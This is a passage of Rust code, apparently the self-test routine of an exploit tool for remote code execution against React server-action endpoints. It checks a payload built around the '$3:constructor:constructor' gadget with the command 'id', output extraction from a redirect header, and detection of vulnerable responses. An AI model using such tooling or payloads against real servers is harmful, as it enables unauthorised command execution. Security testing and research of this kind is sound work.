    let payload = create_rce_payload("id", false);
    let checks = vec![
        payload.contains("name=\"0\""),
        payload.contains("name=\"1\""),
        payload.contains("name=\"2\""),
        payload.contains("name=\"3\""),
        payload.contains("name=\"4\""),
        payload.contains("$3:constructor:constructor"),
        payload.contains("$@3"),
        payload.contains("[]"),
    ];
    
    if checks.iter().all(|&x| x) {
        println!("{}", "[+] RCE Payload Structure: PASS".green());
    } else {
        println!("{}", "[-] RCE Payload Structure: FAIL".red());
    }

    // Check 2: Safe Check Payload
    let safe_payload = create_safe_check_payload();
    if safe_payload.contains("[\"$1:a:a\"]") && safe_payload.contains("{}") {
        println!("{}", "[+] Safe Check Payload: PASS".green());
    } else {
        println!("{}", "[-] Safe Check Payload: FAIL".red());
    }

    // Check 3: Encoding/Decoding
    let decode_ok = url_decode("hello%20world") == "hello world" &&
                   url_decode("test%2Fpath") == "test/path" &&
                   url_decode("a+b") == "a b";
    
    if decode_ok {
        println!("{}", "[+] URL Decoding: PASS".green());
    } else {
        println!("{}", "[-] URL Decoding: FAIL".red());
    }

    let encode_ok = js_encode("test'quote") == "test\\'quote" &&
                   js_encode("test\"double") == "test\\\"double" &&
                   js_encode("test\\backslash") == "test\\\\backslash";
                   
    if encode_ok {
        println!("{}", "[+] JS Encoding: PASS".green());
    } else {
        println!("{}", "[-] JS Encoding: FAIL".red());
    }

    // Check 4: Output Extraction
    let headers = vec![
        ("x-action-redirect".to_string(), "/login?a=test%20output".to_string()),
    ];
    let output = extract_output_from_redirect(&headers);
    if output == Some("test output".to_string()) {
        println!("{}", "[+] Output Extraction: PASS".green());
    } else {
        println!("{}", "[-] Output Extraction: FAIL".red());
    }
    
    // Check 5: Vulnerability Detection
    let vuln_detect_ok = is_vulnerable_response(500, "some text E{\"digest\" more text") &&
                        !is_vulnerable_response(200, "E{\"digest\"") &&
                        !is_vulnerable_response(500, "no digest here");
                        
    if vuln_detect_ok {
        println!("{}", "[+] Vulnerability Logic: PASS".green());
    } else {
        println!("{}", "[-] Vulnerability Logic: FAIL".red());
    }
    
    println!("{}", "\nDiagnostics complete.".yellow());
}